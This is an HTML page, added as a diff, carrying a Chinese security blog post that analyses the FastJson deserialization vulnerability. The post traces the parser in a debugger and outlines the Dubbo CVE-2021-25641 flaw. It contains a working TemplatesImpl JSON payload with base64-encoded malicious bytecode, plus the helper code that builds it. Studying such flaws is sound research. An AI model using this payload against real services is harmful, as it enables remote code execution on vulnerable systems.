@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>FastJson反序列化漏洞 - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="FastJson反序列化漏洞 - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/03/02/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-02T09:32:40.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/At-Dawn/">At Dawn</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>2,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">FastJson反序列化漏洞</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="Fastjson之任意get、set调用"><a href="#Fastjson之任意get、set调用" class="headerlink" title="Fastjson之任意get、set调用"></a>Fastjson之任意get、set调用</h1><h2 id="get、set"><a href="#get、set" class="headerlink" title="get、set"></a>get、set</h2><p>在这以TemplatesImpl链来讲:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;, \&quot;_bytecodes\&quot;:[\&quot;yv66vgAAADQAOwoACQAqCgArACwIAC0KACsALgcALwcAMAoABgAxBwAyBwAzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAClMY29tL2V4YW1wbGUvZmFzdGpzb25fdG9zdHJpbmcvZXZpbGNsYXNzOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBABBNZXRob2RQYXJhbWV0ZXJzAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHADQBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAC8BAApTb3VyY2VGaWxlAQAOZXZpbGNsYXNzLmphdmEMAAoACwcANQwANgA3AQAEY2FsYwwAOAA5AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKADoBACdjb20vZXhhbXBsZS9mYXN0anNvbl90b3N0cmluZy9ldmlsY2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAAsADgAAAAwAAQAAAAUADwAQAAAACQARABIAAgAMAAAAKwAAAAEAAAABsQAAAAIADQAAAAYAAQAAABYADgAAAAwAAQAAAAEAEwAUAAAAFQAAAAUBABMAAAABABYAFwADAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAGwAOAAAAIAADAAAAAQAPABAAAAAAAAEAGAAZAAEAAAABABoAGwACABwAAAAEAAEAHQAVAAAACQIAGAAAABoAAAABABYAHgADAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAIAAOAAAAKgAEAAAAAQAPABAAAAAAAAEAGAAZAAEAAAABAB8AIAACAAAAAQAhACIAAwAcAAAABAABAB0AFQAAAA0DABgAAAAfAAAAIQAAAAgAIwALAAEADAAAAGYAAwABAAAAF7gAAhIDtgAEV6cADUu7AAZZKrcAB7+xAAEAAAAJAAwABQADAA0AAAAWAAUAAAAOAAkAEQAMAA8ADQAQABYAEgAOAAAADAABAA0ACQAkACUAAAAmAAAABwACTAcAJwkAAQAoAAAAAgAp\&quot;], &#x27;_name&#x27;:&#x27;c.c&#x27;, &#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123;&#125;, \&quot;_name\&quot;:\&quot;a\&quot;, \&quot;_version\&quot;:\&quot;1.0\&quot;, \&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">        <span class="comment">//因为bytescodes等属性私有，需要加Feature.SupportNonPublicField</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中的字节码base64加密过了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjson_tostring;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filepath</span> <span class="operator">=</span> <span class="string">&quot;C:\\Users\\22927\\Downloads\\fastjson_tostring\\target\\classes\\com\\example\\fastjson_tostring\\evilclass.class&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filepath);</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span> n;</span><br><span class="line">            <span class="keyword">while</span>((n = fis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">                bos.write(b,<span class="number">0</span>,n);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            bos.close();</span><br><span class="line">            buffer = bos.toByteArray();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> ((Base64.Encoder) encoder).encodeToString(buffer);</span><br><span class="line">        System.out.println(value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这里FastJson的版本为1.24，高了的话有waf，但也可以绕过，参考下P的文章<br>断点给在<code>JSON.parseObject</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677305618533-8896fba2-0c07-4bb9-9266-df1f1d5fb4fa.png#averageHue=%232a2c2a&clientId=u4b384332-f3fe-4&from=paste&height=536&id=u24238501&name=image.png&originHeight=670&originWidth=1340&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1219869&status=done&style=none&taskId=ud75775a5-6609-46d6-826c-dfa5dc2482b&title=&width=1072" alt="image.png"><br>实际上也是调用了parse方法，做了一层强转封装，继续跟进：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677305657053-f02001e4-91c7-4027-b539-24afb79a084f.png#averageHue=%232c2d29&clientId=u4b384332-f3fe-4&from=paste&height=297&id=u2f0f5896&name=image.png&originHeight=371&originWidth=1440&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=748921&status=done&style=none&taskId=u6f4674d9-2d07-466e-9171-a4f222565d7&title=&width=1152" alt="image.png"><br>还是进了parse，继续跟：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677305716172-ce09f9af-c614-459e-a1fd-fb8cfdce8a9e.png#averageHue=%232a2c29&clientId=u4b384332-f3fe-4&from=paste&height=565&id=u5f2db98c&name=image.png&originHeight=706&originWidth=1463&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1378189&status=done&style=none&taskId=ue6698ed8-73d0-40bc-9957-7bbce41fa7d&title=&width=1170.4" alt="image.png"><br>还是一个parse，从这里可以发现parseObject方法实际就是parse的封装，这里的parser是<code>DeafaultJsonParser</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677305740199-3ce707a2-16e5-4ac6-afda-62df9297c48e.png#averageHue=%232c2c29&clientId=u4b384332-f3fe-4&from=paste&height=144&id=u3595b2cd&name=image.png&originHeight=180&originWidth=1424&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=342128&status=done&style=none&taskId=u76621d86-d168-46f6-9ee5-d0df624caa9&title=&width=1139.2" alt="image.png"><br>继续跟进：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677305818149-6f489257-10d3-47b2-b315-20c6c49e487e.png#averageHue=%232a2c2a&clientId=u4b384332-f3fe-4&from=paste&height=651&id=u787b3073&name=image.png&originHeight=814&originWidth=1460&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1587198&status=done&style=none&taskId=u1094a1e7-8e6e-4aa7-bbb7-d8e29e5bbae&title=&width=1168" alt="image.png"><br>因为token是12所以进入了case12，调用了<code>this.parseObject</code>，在该方法中将key提取出：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677305947563-69f51c65-49c4-42a8-94ac-840d677a7f08.png#averageHue=%23292a29&clientId=u4b384332-f3fe-4&from=paste&height=513&id=u61b2480c&name=image.png&originHeight=641&originWidth=1472&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1255275&status=done&style=none&taskId=uc8335de4-486f-46ac-9fc7-f3e9cff4b98&title=&width=1177.6" alt="image.png"><br>然后加载恶意类：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677306068614-0c820a09-9ea3-487e-bc51-15ebf0693239.png#averageHue=%232a2b28&clientId=u4b384332-f3fe-4&from=paste&height=465&id=ubca85df0&name=image.png&originHeight=581&originWidth=1500&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1204344&status=done&style=none&taskId=ufd6c05d8-fa7c-4149-87aa-c35b2c405ed&title=&width=1200" alt="image.png"><br>跟进loadClass，这里就是将恶意class放入mapping中<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677306232085-22872c10-641d-47ca-a166-63aecc392e5d.png#averageHue=%23292b29&clientId=u4b384332-f3fe-4&from=paste&height=539&id=u03c11a2a&name=image.png&originHeight=674&originWidth=1560&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1390145&status=done&style=none&taskId=u0107dc17-62d5-4b56-acde-03ca0e19c15&title=&width=1248" alt="image.png"><br>然后回到DeafaultJsonParser，调用<code>getDeserializer</code>将恶意类进行JSON反序列化：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677306909496-1c210917-47f3-4d7d-b41e-a9cf0db4f004.png#averageHue=%23292b29&clientId=u4b384332-f3fe-4&from=paste&height=525&id=u8741b068&name=image.png&originHeight=656&originWidth=1541&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1354762&status=done&style=none&taskId=u5b8e7154-ed8a-41c5-917c-480187a00c8&title=&width=1232.8" alt="image.png"><br>然后跟进该方法，到了PaserConfig类，调用了该类的getDeserialzier：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677306956545-b4443750-e870-4d79-8dfe-a88a5d673a8c.png#averageHue=%232a2c28&clientId=u4b384332-f3fe-4&from=paste&height=283&id=u2d5959ac&name=image.png&originHeight=354&originWidth=1331&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=674450&status=done&style=none&taskId=ub38402b2-6227-40f6-b774-541f284258c&title=&width=1064.8" alt="image.png"><br>在里面创建了个JavaBeanDeserializer：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677306983256-dd3ece05-9c63-4460-bb48-3b65e7c1649f.png#averageHue=%23292a26&clientId=u4b384332-f3fe-4&from=paste&height=140&id=u89a5d308&name=image.png&originHeight=175&originWidth=1243&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=307924&status=done&style=none&taskId=udefd3cac-a109-45c5-9188-5e94630d38f&title=&width=994.4" alt="image.png"><br>在这个方法中调用了JavaBeanDeserializer的构造方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677307007833-a55d9265-ad62-4e06-8baf-4e049ab288b9.png#averageHue=%23323430&clientId=u4b384332-f3fe-4&from=paste&height=104&id=u5c6d2549&name=image.png&originHeight=130&originWidth=928&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=176202&status=done&style=none&taskId=u22980674-60be-4979-80ff-eb243e57741&title=&width=742.4" alt="image.png"><br>进入了JavaBean.build方法中：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677307046891-e589101e-4326-4fdc-a7cc-966420ee86d2.png#averageHue=%232a2c2a&clientId=u4b384332-f3fe-4&from=paste&height=622&id=uc235dacb&name=image.png&originHeight=777&originWidth=1360&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1428203&status=done&style=none&taskId=ube527f3e-0ec3-4f73-9d6a-939b8d189a6&title=&width=1088" alt="image.png"><br>在这里面寻找get和set方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677307080258-06033924-a852-4d85-8418-5f9b13127ff8.png#averageHue=%232e302c&clientId=u4b384332-f3fe-4&from=paste&height=95&id=ue0ff8c5f&name=image.png&originHeight=119&originWidth=1178&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=199112&status=done&style=none&taskId=udd804857-7bed-42c0-9074-441da93e609&title=&width=942.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677307087275-9d774be5-e6cd-440b-8119-f72ca085a3a6.png#averageHue=%232d2e2a&clientId=u4b384332-f3fe-4&from=paste&height=126&id=u67b6cf1d&name=image.png&originHeight=157&originWidth=1267&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=279846&status=done&style=none&taskId=u5051de47-3925-42cd-9b68-55550c57d4c&title=&width=1013.6" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677307205250-7e12fc76-0967-4204-a538-0e5a83622d03.png#averageHue=%232a2c2a&clientId=u4b384332-f3fe-4&from=paste&height=482&id=uc22c179d&name=image.png&originHeight=603&originWidth=1340&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1087287&status=done&style=none&taskId=u6bff512c-f62d-403c-a424-3364bd3085f&title=&width=1072" alt="image.png"><br>可以看到调用了getOutputProperties，接下来就是一个TemplatesImpl字节码加载了</p>
+<h2 id="get"><a href="#get" class="headerlink" title="get"></a>get</h2><p>准备一个pojo：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjson_tostring;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span>  String address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.fastjson_tostring;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">getdemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        User user=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">JSON_Serialize</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">         System.out.println(JSON_Serialize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接运行会发现：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677308174450-b7ceadc5-f1ca-4ebb-a243-0791a2341fea.png#averageHue=%23232524&clientId=u4b384332-f3fe-4&from=paste&height=174&id=ue1db53de&name=image.png&originHeight=218&originWidth=946&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=273029&status=done&style=none&taskId=u7af720bb-c6ff-4f3c-8152-9002a9d58ab&title=&width=756.8" alt="image.png"><br>调用了get方法，断点分析一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677308210304-fc3b4c2a-c06a-405c-8c2d-5807fe961a77.png#averageHue=%2330302c&clientId=u4b384332-f3fe-4&from=paste&height=98&id=u0ce288cf&name=image.png&originHeight=122&originWidth=839&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=148529&status=done&style=none&taskId=u933c053e-83ba-4296-a045-8dd64fbfff8&title=&width=671.2" alt="image.png"><br>还是调用<code>toJSONString</code>，继续跟进：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677308230855-8fb0cd74-2124-4ae3-a0b1-b2a70fdc9e09.png#averageHue=%232d2e2a&clientId=u4b384332-f3fe-4&from=paste&height=85&id=u3fea148e&name=image.png&originHeight=106&originWidth=1343&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=203770&status=done&style=none&taskId=u154aa097-9ac5-4eaa-86f3-338997257cc&title=&width=1074.4" alt="image.png"><br>依然是一个toJSONString，和上面很像是一层层封装：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677308265446-131936d6-0841-4172-8e5c-60a11e6ff6b6.png#averageHue=%23282a28&clientId=u4b384332-f3fe-4&from=paste&height=111&id=u019d0160&name=image.png&originHeight=139&originWidth=1280&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=236219&status=done&style=none&taskId=u6dcbc0ac-8afc-40a5-89d7-5c1c69fb973&title=&width=1024" alt="image.png"><br>最后在该toJSONString方法中调用了<code>serializer.write</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677308305217-609023da-b673-4fdd-8137-9aed60f4eb1f.png#averageHue=%23292b2a&clientId=u4b384332-f3fe-4&from=paste&height=437&id=u666f151d&name=image.png&originHeight=546&originWidth=1490&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1076676&status=done&style=none&taskId=ub49f1518-70eb-44ce-8601-c577164e208&title=&width=1192" alt="image.png"><br>调用writer.write方法，这里的writer是ASMSerializer_User，一个和User有关的类，继续跟进：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677308441818-ea1451be-976a-4999-b113-a8147a206c2b.png#averageHue=%232a2b29&clientId=u4b384332-f3fe-4&from=paste&height=568&id=ubaf5610d&name=image.png&originHeight=710&originWidth=1901&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1793212&status=done&style=none&taskId=u939dbc04-9b1f-45b8-b8db-f605610fddc&title=&width=1520.8" alt="image.png"><br>就到了getName方法了，这里的逻辑无法查看QWQ,ASMSerializer_User调试看不到，只要知道会调就好了</p>
+<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>对应的是JSON.parse方法，逻辑类似就不调试了</p>
+<h1 id="FastJson反序列化链"><a href="#FastJson反序列化链" class="headerlink" title="FastJson反序列化链"></a>FastJson反序列化链</h1><ul>
+<li>TemplatesImpl链</li>
+<li>JdbcRowSetImpl链子</li>
+</ul>
+<p>其中第一条更偏向于CC链，第二条就纯纯是JNDI注入了<br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1579/#toc_">https://tttang.com/archive/1579/#toc_</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12096#toc-3">https://xz.aliyun.com/t/12096#toc-3</a></p>
+<h1 id="Dubbo-Kryo-x2F-FST反序列化漏洞（CVE-2021-25641）"><a href="#Dubbo-Kryo-x2F-FST反序列化漏洞（CVE-2021-25641）" class="headerlink" title="Dubbo Kryo&#x2F;FST反序列化漏洞（CVE-2021-25641）"></a>Dubbo Kryo&#x2F;FST反序列化漏洞（CVE-2021-25641）</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Dubbo Provider即服务提供方默认使用dubbo协议来进行RPC通信，而dubbo协议默认是使用Hessian2序列化格式进行对象传输的，但是针对Hessian2序列化格式的对象传输可能会有黑白名单设置的限制，参考：<a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/pull/6378">https://github.com/apache/dubbo/pull/6378</a><br>针对这种场景，攻击者可以通过更改dubbo协议的第三个flag位字节来更改为使用Kryo或FST序列化格式来进行Dubbo Provider反序列化攻击从而绕过针对Hessian2反序列化相关的限制来达到RCE。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li>Dubbo 2.7.0 to 2.7.8</li>
+<li>Dubbo 2.6.0 to 2.6.9</li>
+<li>Dubbo all 2.5.x versions (not supported by official team any longer)</li>
+</ul>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p><a target="_blank" rel="noopener" href="https://github.com/Dor-Tumarkin/CVE-2021-25641-Proof-of-Concept/blob/main/DubboProtocolExploit/src/main/java/DubboProtocolExploit/Main.java">https://github.com/Dor-Tumarkin/CVE-2021-25641-Proof-of-Concept/blob/main/DubboProtocolExploit/src/main/java/DubboProtocolExploit/Main.java</a></p>
